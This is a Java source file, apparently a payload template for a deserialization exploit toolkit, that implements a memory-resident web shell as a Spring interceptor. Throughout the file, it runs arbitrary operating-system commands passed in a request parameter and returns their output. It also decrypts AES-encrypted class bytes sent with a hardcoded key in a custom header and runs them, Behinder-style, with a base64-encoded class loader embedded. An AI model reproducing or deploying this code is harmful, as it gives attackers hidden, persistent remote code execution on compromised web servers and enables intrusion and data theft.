package ysoserial.template;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import sun.misc.BASE64Decoder;

@Controller
public class DynamicInterceptorTemplate extends HandlerInterceptorAdapter {
    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";
    private String behinderShellHeader = "X-Options-Bi";
    private String behinderShellPwd = "202cb962ac59075b";

    public DynamicInterceptorTemplate() {
        this.initialize();
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[+] Dynamic Interceptor says hello");
        String k;
        Cipher cipher;
        if (request.getParameter("type") != null && request.getParameter("type").equals("basic")) {
            k = request.getParameter(this.basicCmdShellPwd);
            response.setStatus(HttpServletResponse.SC_OK);
            if (k != null && !k.isEmpty()) {
                cipher = null;
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                response.getWriter().println(result);
                return false;
            }
        } else if (request.getHeader(this.behinderShellHeader) != null) {
            try {
                if (request.getMethod().equals("POST")) {
                    response.setStatus(HttpServletResponse.SC_OK);
                    k = this.behinderShellPwd;
                    request.getSession().setAttribute("u", k);
                    cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));
                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object var8 = evilClass.newInstance();
                    Method var9 = evilClass.getDeclaredMethod("equals", Object.class);
                    HashMap var10 = new HashMap(3);
                    var10.put("session", request.getSession());
                    var10.put("response", response);
                    var10.put("request", request);
                    var9.invoke(var8, var10);
                    return false;
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        }

        return true;
    }

    private void initialize() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

            try {
                this.myClassLoaderClazz = classLoader.loadClass("com.feihong.ldap.template.MyClassLoader");
            } catch (ClassNotFoundException var8) {
                Class clazz = classLoader.getClass();
                Method method = null;

                while(method == null && clazz != Object.class) {
                    try {
                        method = clazz.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                    } catch (NoSuchMethodException var7) {
                        clazz = clazz.getSuperclass();
                    }
                }

                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
                byte[] bytes = (new BASE64Decoder()).decodeBuffer(code);
                method.setAccessible(true);
                this.myClassLoaderClazz = (Class)method.invoke(classLoader, bytes, 0, bytes.length);
            }
        } catch (IllegalAccessException var9) {
            var9.printStackTrace();
        } catch (IOException var10) {
            var10.printStackTrace();
        } catch (InvocationTargetException var11) {
            var11.printStackTrace();
        }

    }
}
